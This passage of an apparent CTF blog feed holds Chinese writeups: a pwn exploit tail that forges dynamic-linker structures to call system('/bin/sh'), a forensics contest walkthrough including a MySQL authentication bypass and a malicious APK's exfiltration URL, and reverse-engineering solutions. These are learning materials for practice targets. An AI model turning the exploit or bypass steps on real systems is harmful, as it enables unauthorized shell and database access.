class="line">0x6fffffff,0x1,  # bss+0x4b4</span><br><span class="line">0,0,  # bss+0x4bc</span><br><span class="line">0,0,                   # bss+0x4c4</span><br><span class="line">&#x27;system\0\0&#x27;,# strtab    bss+0x4cc</span><br><span class="line">0,0,0,&#x27;\0\0\0\0&#x27;,0,0,0,&#x27;\x00\0\0\0&#x27;,# symtab  bss+0x4d4</span><br><span class="line">f.got[&#x27;read&#x27;],0x107, #rel bss+0x4f4</span><br><span class="line">&#x27;/bin/sh\0&#x27;# 0x4fc</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def change(addr,value,length=4):</span><br><span class="line">sla(&#x27;2015~!\n&#x27;,0x6c*&#x27;a&#x27;+flat(0,f.plt[&#x27;read&#x27;],main,0,addr,length))</span><br><span class="line">s(p32(value))</span><br><span class="line"></span><br><span class="line">sla(&#x27;2015~!\n&#x27;,0x6c*&#x27;a&#x27;+flat(0,f.plt[&#x27;read&#x27;],main,0,bss+0x400,0x200))</span><br><span class="line">pause(2)</span><br><span class="line">sl(fake)</span><br><span class="line"></span><br><span class="line">sla(&#x27;2015~!\n&#x27;,0x6c*&#x27;a&#x27;+flat(0,f.plt[&#x27;write&#x27;],main,1,link_map,4))</span><br><span class="line">head=uu32(p.recv(4))</span><br><span class="line">log.info(&#x27;head:&#x27;+hex(head))</span><br><span class="line"></span><br><span class="line">#change(head+8,bss+0x42c) # 后来发现这句也不必要</span><br><span class="line">change(head+0x20+20,bss+0x44c,bss+0x4f4)</span><br><span class="line">change(head+0x24+20,bss+0x454)</span><br><span class="line">change(head+0x60+28,bss+0x48c)</span><br><span class="line">sla(&#x27;2015~!\n&#x27;,0x6c*&#x27;a&#x27;+flat(bss+0x400,resolve,head,0,0,bss+0x4fc))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;但这种做法当程序关闭输出流时便不奏效了，可拓展性很差。目前还在摸索怎么自己构造<code>link_map</code>。。下次一定！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&amp;emsp;&amp;emsp;好久不见呀~</summary>
    
    
    
    
    <category term="stack" scheme="http://ll1ng.github.io/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>弘联杯甘政法</title>
    <link href="http://ll1ng.github.io/2020/11/19/forensics/"/>
    <id>http://ll1ng.github.io/2020/11/19/forensics/</id>
    <published>2020-11-19T02:37:53.000Z</published>
    <updated>2020-11-19T02:37:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp;&ensp;这是哪来的题其实我也不知道…但跟<a href="https://blog.muted.top/">MUTED</a>学到蛮多东西的所以打算记一下！（谢谢大哥！）<span id="more"></span><br><br>&ensp;&ensp;感谢<a href="https://arttnba3.cn/">a3</a>和<a href="https://endcat.cn/">囧姐姐</a>愿意带我打比赛qaq。10月和11月跟着他们参加了长安杯和美亚杯。说来这好像是自己第一次真正意义上参加团队比赛。<br>&ensp;&ensp;本人取证比赛是速成，零基础到接触取证之前都不知道移动硬盘和内存条能干啥，（内存条yyds！）对计算机硬件知识也知之甚少，所以应该不少地方都会有错误，记录下来的只是当前我和周围同学的做题方法。如果你有更好的方法或是发现了我的错误，欢迎在评论区指出。</p><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><p><a href="https://cowtransfer.com/s/d3597f21de134a">这里下载</a>（看了下2021年10月前应该都能下）</p><h1 id="个人赛"><a href="#个人赛" class="headerlink" title="个人赛"></a>个人赛</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><p>检材1.E01、2.E01、3.E01、4.E01为某磁盘阵列的磁盘镜像，以此为依据回答1-5题。<br><br><strong>1.该阵列采用的阵列方式为（）。</strong></p><blockquote><p>A.Raid 0<br><br>B.Raid 5<br><br>C.HP双循环<br><br>D.Raid 6<br></p></blockquote><p><strong>2.该阵列配置排列为（）</strong></p><blockquote><p>A.左同步<br><br>A.左异步<br><br>A.右同步<br><br>A.右异步<br></p></blockquote><p><strong>3.该阵列条带大小为（）KB</strong></p><blockquote><p>A.64<br><br>A.128<br><br>A.256<br><br>A.512<br></p></blockquote><p><strong>4.以1234盘序组成阵列，阵列偏移量的扇区号为（）</strong></p><blockquote><p>A.18432<br><br>A.106494<br><br>A.19456<br><br>A.3622<br></p></blockquote><p><strong>5.从阵列中提取的镜像文件的SHA256值为</strong></p><p>&ensp;&ensp;据说这是一道Raid重组。将4个检材加入取证大师。4个检材就有$A_4^4$=24中组合可能。点击<code>自动计算磁盘序列</code>，出来结果一般第一个就是正确的。但这个貌似不是，按照第一个4321的顺序与其他不正确的顺序排序都没什么区别。<br><img src="https://i.loli.net/2020/11/29/JgSWAeEYCIzfrBM.png" alt="raid.png"></p><p>右键单击图示区域可进行raid重组。<br><img src="https://i.loli.net/2020/11/29/bajtzwAylqKOWo5.png" alt="click.png"><br>只有在1234这种排列方式下，右键windows镜像进行<code>虚拟磁盘解析</code>才能解析出正常的结构，如图：<br><img src="https://i.loli.net/2020/11/29/dFNAGheJ871EDUP.png" alt="r.png"><br><img src="https://i.loli.net/2020/11/29/RbDoT6CJs5n3IW8.png" alt="result.png"><br>所以1题：Raid 5,2题：左同步,3题：512（1024扇区*512b扇区大小/1024）,4题18432,5题右键进行哈希值计算。</p><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>&ensp;&ensp;案情：学生陈某通过某聊天软件向张某购买游戏外挂软件，安装后发现被骗，在担心自己手机信息被该软件窃取后向公安机关报案。警方根据陈某提供的线索顺利抓捕了嫌疑人张某，现场固定了张某使用的个人笔记本电脑“win10镜像.E01”（开机密码为qwer@123）。<br>请以检材”win10镜像.E01”为依据，回答6-19题。</p><p><strong>6.检材”win10镜像.E01”源盘的SHA256值为</strong><br></p><blockquote><p>3DEFA69BDCE111…<br></p></blockquote><p><strong>7.检材”win10镜像.E01”操作系统版本号为</strong><br></p><blockquote><p>1903<br></p></blockquote><p>啊咧？忘掉了…<br><br><strong>8.嫌疑人使用的Windows账户名为</strong><br><br>自动取证-系统痕迹-系统信息-用户信息。只有<code>ssssss</code>启用。<br></p><blockquote><p>ssssss<br></p></blockquote><p><strong>9.受害人陈某使用的邮箱账户为</strong><br><br>系统痕迹-邮件解析-发件箱，收件人邮箱</p><blockquote><p><a href="mailto:&#x31;&#56;&#50;&#53;&#49;&#x39;&#x36;&#x31;&#x38;&#x32;&#x36;&#64;&#x31;&#51;&#x39;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#56;&#50;&#53;&#49;&#x39;&#x36;&#x31;&#x38;&#x32;&#x36;&#64;&#x31;&#51;&#x39;&#x2e;&#x63;&#x6f;&#x6d;</a></p></blockquote><p><strong>10.嫌疑人发送apk所使用的邮箱地址为</strong><br><br>同上，发件人邮箱</p><blockquote><p><a href="mailto:&#x31;&#x31;&#51;&#x37;&#x35;&#x38;&#56;&#51;&#52;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x31;&#x31;&#51;&#x37;&#x35;&#x38;&#56;&#51;&#52;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;</a></p></blockquote><p><strong>11.找出嫌疑人发给陈某的外挂apk软件，计算其SHA256值为()</strong><br><br>导出计算</p><blockquote><p>98203b8cd07…</p></blockquote><p><strong>12.嫌疑人使用第三方工具连接发卡平台服务器时，发卡平台服务器的IP地址是（）</strong></p><blockquote><p>172.16.80.99</p></blockquote><p>好像不会…<br><br><strong>13.通过对嫌疑人检材进行分析，发现该检材中安装有反取证软件，该检材最后一次运行反取证软件的时间是（）</strong></p><blockquote><p>2020-06-11 14:01:05</p></blockquote><p>系统痕迹-反取证软件分析，得到名称<code>VeraCrypt.exe</code>，然后没找到匹配的emm。<br><strong>14.嫌疑人检材中的手机备份文件其SHA256值为</strong></p><blockquote><p>9ba21f5bc…</p></blockquote><p>先找到手机备份文件。自己再做的时候记不清路径了，就用高级过滤过滤了一下逻辑大小在500MB以上的，找到了一个叫<code>jiami</code>的文件。接着查看自动取证-用户痕迹-最近访问记录，第一个就是<code>miyao.xml</code>。顺着路径去找却没有找到，后来从取证结果-回收站删除记录里导出了密钥文件。用<code>VeraCrypt</code>加载<code>jiami</code>，提示有密码，选择<code>使用密钥文件</code>，添加导出的<code>xml</code>即可成功挂载。解压挂载盘里的<code>tar</code>包进入套路…<br><br><strong>15.该备份手机的系统版本是（）</strong><br></p><blockquote><p>12.4.8</p></blockquote><p>分析-基本信息-设备信息<br><br><strong>16.该备份手机的IMEI号为（）</strong><br></p><blockquote><p>352038064601143</p></blockquote><p>同上<br><br><strong>17.该备份手机的iCloud账号为（）</strong></p><blockquote><p><a href="mailto:&#49;&#x36;&#50;&#x32;&#x36;&#50;&#57;&#x34;&#x34;&#57;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;">&#49;&#x36;&#50;&#x32;&#x36;&#50;&#57;&#x34;&#x34;&#57;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;</a></p></blockquote><p>同上<br><br><strong>18.陈某是通过哪种聊天工具联系到嫌疑人的（）</strong></p><blockquote><p>蝙蝠</p></blockquote><p>就，一通翻吧…<br><br><strong>19.陈某在该聊天工具中的用户ID为</strong></p><blockquote><p>4273008</p></blockquote><p>账户信息<br><br><strong>20.疑似嫌疑人使用的发卡平台管理员账号的登录密码为（）</strong></p><blockquote><p>123456</p></blockquote><p>8会</p><h1 id="团体赛"><a href="#团体赛" class="headerlink" title="团体赛"></a>团体赛</h1><p>linux的我好像习惯仿真做emm。用火眼仿真完用<code>vmware</code>打开，这个时候输入命令打印的内容如果太多会显示不全，可以用本机自己的shell ssh上这个服务器，还是挺方便。<br><strong>1.检材“disk01.E01”源盘的SHA256值为（）</strong></p><blockquote><p>91b0227fa…</p></blockquote><p><strong>2.发卡平台服务器的内核版本为（ ）</strong></p><blockquote><p>3.10.0-1062.18.1.el7.x86_64<br></p></blockquote><p><code>cat /proc/version</code><br><br><strong>3.发卡平台服务器中root账号最后一次的登陆时间为（）</strong></p><blockquote><p>2020-9-11 17:03:48</p></blockquote><p><code>more /var/log/secure</code>有一行</p><blockquote><p>Sep 11 17:03:48 iZbp147nnfz5942tvie7f4Z sshd[2512]: pam_unix(sshd:session): session opened for user root by (uid=0)</p></blockquote><p><strong>4.发卡平台服务器设置过一个定时任务，该定时任务在服务器中的存放路径为（）</strong></p><blockquote><p>/var/spool/cron/root</p></blockquote><p>百度到定时任务的路径是<code>/var/spool/cron</code>，文件内容长这样：<br><br><code>30 1 * * *  /www/server/cron/c4ed65ef4ec0b5389d8215829fd496f9 &gt;&gt; /www/server/cron/c4ed65ef4ec0b5389d8215829fd496f9.log 2&gt;&amp;1</code><br><br><strong>5.发卡平台绑定的域名为（）（ 多选题 ）</strong></p><blockquote><p>ofaka.zf,ofaka.game</p></blockquote><p>其实找关键文件的思路我也不太懂。这个题既然说了域名那就和<code>host</code>有关。于是<br><br><code>cat /www/server/panel/vhost/nginx/ofaka.game.conf</code>的<code>server_name</code>就是答案。<br><br><strong>6.发卡平台服务器与数据库连接的配置文件为（）</strong></p><blockquote><p>application.ini</p></blockquote><br><p>免密进入数据库的步骤：<br><code>service mysqld stop</code><br><code>mysqld_safe --skip-grant-tables</code><br><code>mysql -u root -p</code><br>然后回车。<br><br><strong>7.数据库的版本为（）</strong></p><blockquote><p>5.6.48</p></blockquote><p><code>mysql -V</code><br><br>打印出的结果是<br><code>mysql  Ver 14.14 Distrib 5.6.48, for Linux (x86_64) using  EditLine wrapper</code><br>这个版本要看Distrib后面的部分。或者进入数据库后输入<code>select version();</code><br></p><p><strong>8.数据库root账号的密码为（）</strong></p><blockquote><p>d4fd620fed2205ec</p></blockquote><p>可以通过尝试（原题是选择题）<br>或者进入数据库后<code>select password(&#39;xxx&#39;);</code>与<code>use mysql;show tables;select user,password from user;</code>（依次执行）的结果比较。（好像差不多吼）<br><br><strong>9.请找出该发卡平台后台管理页面管理员的登录地址http://（）</strong></p><blockquote><p><a href="http://ofaka.game/Admin/login">http://ofaka.game/Admin/login</a>, <a href="http://ofaka.zf/Admin/login">http://ofaka.zf/Admin/login</a></p></blockquote><p>8会<br><br><strong>10.该发卡平台中曾注册过一个测试账号，该账号的邮箱为（）</strong></p><blockquote><p><a href="mailto:&#52;&#x33;&#x30;&#x33;&#x36;&#52;&#53;&#54;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d;">&#52;&#x33;&#x30;&#x33;&#x36;&#52;&#53;&#54;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d;</a></p></blockquote><p>进入数据库后<code>use ofaka_game;show tables;select * from t_user;</code><br><strong>11.该发卡平台中测试账号创建时间为（）</strong></p><blockquote><p>2018-05-09 17:18:08</p></blockquote><p>上题的<code>createtime</code>为<code>1525857488</code>，用<code>select FROM_UNIXTIME(1525857488,&#39;%Y-%m-%d %H:%i:%s&#39;);</code>转换<br><br><strong>12.发卡平台网站中用来实现管理员账号登陆验证的代码存在于（）文件中</strong></p><blockquote><p>M_Admin_user.php</p></blockquote><p>导出<code>/www/wwwroot/default.com</code>文件夹，用<code>vscode</code>打开，搜索<code>admin</code>或者<code>login</code>，找到答案文件中<code>checkLogin</code>方法比较符合。<br><br><strong>13.利用现有的管理员账号登陆验证机制，如果将密码重置为“HL2020”，其他信息保持不变的情况下，数据库中“password”字段应该修改为</strong></p><blockquote><p>414d8c248fb2b9221d7d7b7caa21d950</p></blockquote><p><code>select</code>了个啥来着得到密码和旁边一串，旁边一串就是<code>salt</code>，然后代入定义的<code>password()</code>得到密码。运行的时候可以命令行<code>php -a</code>进入交互，无脑直接代就好。（好家伙这波过期仿真的虚拟机都打不开…<br><br><strong>14.陈某购买外挂软件的订单号是（）</strong></p><blockquote><p>zlkb2020091114355418256</p></blockquote><p>去数据库中<code>select * from t_order;</code>比对<br><br><strong>15.陈某购买外挂软件时的下单时间是（）</strong></p><blockquote><p>2020-09-11 14:35:54</p></blockquote><p>火眼中蝙蝠聊天记录里看到下单时间在2020-09-11 14:31:11之后，<code>select unix_timestamp(&#39;2020-09-11 14:31:11&#39;);</code>得到时间戳<code>1599805871</code>，下单时间在此之后，所以最后一项订单符合。<br><br><strong>16.陈某购买外挂软件时使用的查询密码是（）</strong></p><blockquote><p>112233</p></blockquote><p>忘了，火眼也过期了<br><br><strong>17.该APK软件的包名为（）</strong></p><blockquote><p>io.dcloud.PandoraEntry</p></blockquote><p><code>aapt d badging HPJY_3.1.apk</code><br><br><strong>18.该APP具有以下哪些权限（）</strong></p><blockquote><p>直接拨打电话，更改网络连接状态，读取通讯录，读取手机状态，录音</p></blockquote><p>同上<br><br><strong>19.该APP的签名算法为（）</strong></p><blockquote><p>SHA1withRSA</p></blockquote><p>将apk解压至HPJY3.1，<code>keytool -printcert -file HPJY3.1\META-INF\CERT.RSA</code><br><br><strong>20.该APP有盗取手机通讯录的功能，请找出该APP盗取通讯录后的回传地址http://（）</strong></p><blockquote><p>zx.lily4444.fun/Api/index/getlt</p></blockquote><p>将<code>apk</code>导出后，用安卓模拟器打开，在通讯录中添加联系人，打开<code>wireshark</code>准备开始捕获流量包。在输入完手机号和邀请码点击下一步之前，点击开始捕获分组，然后点击app的下一步并停止捕获。在获得的包里搜索联系人姓名。（<code>syml</code>大佬演示过一遍，但是自己搞的时候又没抓不到包了emm）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&amp;ensp;&amp;ensp;这是哪来的题其实我也不知道…但跟&lt;a href=&quot;https://blog.muted.top/&quot;&gt;MUTED&lt;/a&gt;学到蛮多东西的所以打算记一下！（谢谢大哥！）</summary>
    
    
    
    
    <category term="电子取证" scheme="http://ll1ng.github.io/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>moectf2020-部分writeup</title>
    <link href="http://ll1ng.github.io/2020/10/20/moectf2020/"/>
    <id>http://ll1ng.github.io/2020/10/20/moectf2020/</id>
    <published>2020-10-19T16:55:34.000Z</published>
    <updated>2020-10-19T16:55:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>u1s1这次比赛我挺羡慕新生的。指导详尽友好得一，夸一波全体出题人！</p><span id="more"></span><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="protection"><a href="#protection" class="headerlink" title="protection"></a>protection</h2><p>&emsp;&emsp;这个题首先用<code>upx</code>脱壳，使用方法是<code>upx -d file</code>，然后拖入<code>ida</code>，找到主函数，按下<code>f5</code>，看到逻辑如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">printf((unsigned __int64)&quot;please input your flag: &quot;);</span><br><span class="line">  _isoc99_scanf((unsigned __int64)&quot;%28s&quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 27; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( ((unsigned __int8)x[i] ^ (unsigned __int8)v5[i]) != y[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;wrong!&quot;, v5);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;right!&quot;, v5);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;就是将输入与字符串<code>x</code>的每一位进行异或看结果是否等于<code>y</code>的每一位。双击<code>x</code>和<code>y</code>去看看它们分别是什么。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000004CB0F0 x               db &#x27;aouv#@!V08asdozpnma&amp;*#%!$^&amp;*&#x27;,0</span><br><span class="line">...</span><br><span class="line">.data:00000000004CB110 y               db 0Ch, 0, 10h, 15h, 57h, 26h, 5Ah, 23h, 2 dup(40h), 3Eh</span><br><span class="line">.data:00000000004CB110                                         ; DATA XREF: main+6E↑o</span><br><span class="line">.data:00000000004CB110                 db 42h, 37h, 30h, 9, 19h, 3, 1Dh, 50h, 43h, 7, 57h, 15h</span><br><span class="line">.data:00000000004CB110                 db 7Eh, 51h, 6Dh, 43h, 57h, 4 dup(0)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里提取<code>y</code>的时候可以在<code>ida</code>界面下方的<code>python</code>框中进行如下操作。<br><img src="https://i.loli.net/2020/10/20/OGgTwEvInVX7Wud.png" alt="idapython.png"><br>&emsp;&emsp;其中<code>get_bytes(address,length)</code>第一个参数是起始地址，第二个是要提取的数据长度。</p><blockquote><p>这个东东好像是叫<code>idapython</code>来着，高级用法还挺多的，不过我还不大会用……目前只记住了这个</p></blockquote><p>&emsp;&emsp;接下来进行异或就完了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[12, 0, 16, 21, 87, 38, 90, 35, 64, 64, 62, 66, 55, 48, 9, 25, 3, 29, 80, 67, 7, 87, 21, 126, 81, 109, 67, 87]</span><br><span class="line">s=&#x27;aouv#@!V08asdozpnma&amp;*#%!$^&amp;*&#x27;</span><br><span class="line">for i in range(28):</span><br><span class="line">    print(chr(a[i]^ord(s[i])),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>输出结果：<br><code>moectf&#123;upx_1S_simp1e-t0_u3e&#125;</code></p><h2 id="MidPython"><a href="#MidPython" class="headerlink" title="MidPython"></a>MidPython</h2><p>&emsp;&emsp;哈哈哈这题挺好玩。用<code>uncompyle6</code>去逆的时候在加密函数的部分失败了，你说巧不巧……于是跑去问<a href="https://www.wootec.top/">出题人</a>，出题人说是编译环境版本太新的缘故，于是这道题分数就上调了……<br><img src="https://i.loli.net/2020/10/20/yMtEgZKWbCH8RUh.png" alt="midpython.png"><br>&emsp;&emsp;卡了几天，后来看到hint里这句<code>本题考点更高级一点，与easy Python做法完全不同，建议多多了解Python语言，不仅仅只是语法，也包括Python的运行原理等。</code>哦，<strong>完全不同</strong>是吧。我好像明白了什么。于是去百度<code>python运行原理</code>，联系曾经把相对路径里某个文件命名成<code>string.py</code>，又在文件里<code>import string</code>导致调用封装好的函数时却报了<code>undefined</code>的经历，我想我知道做法了。。根据试验结果看（什么鬼），在<code>python</code>文件中<code>import</code>另一个<code>python</code>文件时会优先从当前目录找，找不到才会去安装路径里找，并且会生成<code>.pyc</code>文件。然后试了下<code>import</code>时只要当前路径下有同名<code>.pyc</code>文件同样可以正常运行。这应该就是利用解密函数的思路了。</p><p>&emsp;&emsp;虽然没办法全逆出来，但是逆出来正常的部分已经足够做题了。下面是逆出来的结果（删去了失败的部分）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># uncompyle6 version 3.7.1</span><br><span class="line"># Python bytecode 3.8 (3413)</span><br><span class="line"># Decompiled from: Python 3.8.1 (tags/v3.8.1:1b293b6, Dec 18 2019, 22:39:24) [MSC v.1916 32 bit (Intel)]</span><br><span class="line"># Embedded file name: ./EzPython/source.py</span><br><span class="line"># Compiled at: 2020-07-25 16:57:06</span><br><span class="line"># Size of source mod 2**32: 5784 bytes</span><br><span class="line">T_letter = [&#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="line"></span><br><span class="line">def Create_Matrix(key):</span><br><span class="line">    key = Remove_Duplicates(key)</span><br><span class="line">    key = key.replace(&#x27; &#x27;, &#x27;&#x27;)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        T_letter[j] += key[i]</span><br><span class="line">        if 0 == (i + 1) % 5:</span><br><span class="line">            j += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Remove_Duplicates(key):</span><br><span class="line">    key = key.upper()</span><br><span class="line">    _key = &#x27;&#x27;</span><br><span class="line">    for ch in key:</span><br><span class="line">        if ch == &#x27;I&#x27;:</span><br><span class="line">            ch = &#x27;J&#x27;</span><br><span class="line">        if ch in _key:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            _key += ch</span><br><span class="line"></span><br><span class="line">    return _key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Get_MatrixIndex(ch):</span><br><span class="line">    for i in range(len(T_letter)):</span><br><span class="line">        for j in range(len(T_letter)):</span><br><span class="line">            if ch == T_letter[i][j]:</span><br><span class="line">                return (i, j)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    key = &#x27;YWCNOPJAFGHDTULMQXZEBRVKS&#x27;</span><br><span class="line">    flag_enc = &#x27;WYTFSQOYGYOQKJLHUE&#x27;</span><br><span class="line">    Create_Matrix(key)</span><br><span class="line">    print(&#x27;Please Input flag: &#x27;)</span><br><span class="line">    plaintext = input()</span><br><span class="line">    if plaintext[0:7] != &#x27;moectf&#123;&#x27; or plaintext[(-1)] != &#x27;&#125;&#x27;:</span><br><span class="line">        print(&#x27;Ruaaaaa~Wrong!&#x27;)</span><br><span class="line">        input()</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        plaintext = plaintext[7:-1]</span><br><span class="line">        flag = Encrypt(plaintext, T_letter)</span><br><span class="line">        if flag != flag_enc:</span><br><span class="line">            print(&#x27;Ruaaaaa~Wrong!&#x27;)</span><br><span class="line">            input()</span><br><span class="line">            exit()</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">        print(&#x27;Congratulations!&#x27;)</span><br><span class="line">        input()</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>对去除前后缀以后的部分进行加密，若加密后与<code>flag_enc</code>相同则成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from puzzle import *</span><br><span class="line">key = &#x27;YWCNOPJAFGHDTULMQXZEBRVKS&#x27;</span><br><span class="line">flag_enc = &#x27;WYTFSQOYGYOQKJLHUE&#x27;</span><br><span class="line">Create_Matrix(key)</span><br><span class="line">print(T_letter)</span><br><span class="line"># 这个地方我其实有点惊讶，T_letter在另一个文件里定义了的话原来import后还可以直接在当前文件使用啊。。是我没见识</span><br><span class="line">print(Decrypt(flag_enc,T_letter))</span><br></pre></td></tr></table></figure><p>输出结果：<br><br><code>[&#39;YWCNO&#39;, &#39;PJAFG&#39;, &#39;HDTUL&#39;, &#39;MQXZE&#39;, &#39;BRVKS&#39;]</code></p><p><code>YOUARENOPOWERFULLZ</code></p><p>包上<code>moectf&#123;&#125;</code>提交即可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;u1s1这次比赛我挺羡慕新生的。指导详尽友好得一，夸一波全体出题人！&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="http://ll1ng.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>一道maze</title>
    <link href="http://ll1ng.github.io/2020/07/30/%E4%B8%80%E9%81%93maze/"/>
    <id>http://ll1ng.github.io/2020/07/30/%E4%B8%80%E9%81%93maze/</id>
    <published>2020-07-30T15:18:57.000Z</published>
    <updated>2020-07-30T15:18:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>xctf里新手区的那道maze</p><span id="more"></span><p>​        其实并不是很懂为什么我查到的wp全部一笔带过如何判断上下左右所对应的字母。满屏“易知”“不难看出”还有各种转载我也是挺无语的。。<br></p><h2 id="大概是正常做法8"><a href="#大概是正常做法8" class="headerlink" title="大概是正常做法8"></a>大概是正常做法8</h2><p>​        使用<code>ubuntu</code>中的<code>file</code>命令得知这是一个<code>elf</code>文件 。ida出来后第一个关键在这句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( asc_601060[8 * (signed int)v10 + SHIDWORD(v10)] != &#x27;#&#x27; )</span><br><span class="line">    goto LABEL_20;</span><br><span class="line">  v8 = &quot;Congratulations!&quot;;</span><br></pre></td></tr></table></figure><p><code>asc_601060</code>这个地方就是存储迷宫的地方，看到8*将视图调整为8列显示，如图：</p><p><img src="https://i.loli.net/2020/07/31/WfvrqcyeNK5aVBO.png" alt="迷宫.png"></p><p>我们在上一句看到了宏定义<code>SHIDOWORD</code>，查阅了<a href="https://www.jianshu.com/p/7cc97bdd716d">这篇博客</a>查到这句<code>#define SHIDWORD(x)  (*((int32*)&amp;(x)+1))</code>。对小端序的理解自我认为还阔以吧，解释下就是把当前指针<code>&amp;x</code>强制转换为32位整型指针（4个字节），地址加1，也就到了当前指针+4个字节的位置，指向下一个32位整型数据。在先前的声明中已经看到<code>__int64 v10; // [rsp+0h] [rbp-28h]</code>，所以实际上就是用<code>v10</code>的低4个字节存行（<code>signed int</code>大概是直接取低4个字节？8字节会溢出反正emm），高四个字节存列。<br></p><p>然后再分析四个函数所对应的方向。</p><p><img src="https://i.loli.net/2020/07/31/RMsTgZynlvPJ4p3.png" alt="函数.png"></p><blockquote><p>参数是<code>_DWORD *a1</code>，做图不小心盖住了。<code>char *</code>同理，指向单字节的指针，+-时指向地址+-1个字节。对了，不知道传<code>v3</code>干嘛哦。</p></blockquote><ul><li>左：传入高4字节，指向的内容+1</li><li>右：传入高4字节，+1</li><li>上：传入低4字节，-1</li><li>下：传入低4字节，+1</li></ul><blockquote><p>返回值应该是用来是否出界的。在加完以后判断是否仍小于8，减完之后判断是否仍大于0。</p></blockquote><p>再结合主函数的四个字母可以得出答案。<br></p><h2 id="不用判断上下左右的方法"><a href="#不用判断上下左右的方法" class="headerlink" title="不用判断上下左右的方法"></a>不用判断上下左右的方法</h2><p>​        之前我一直觉得宏定义神马的不用看（想锤死当时的自己），是做一道8位整型溢出的时候才注意到声明得看，宏定义也得看。前两天没看懂的时候是这么做的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 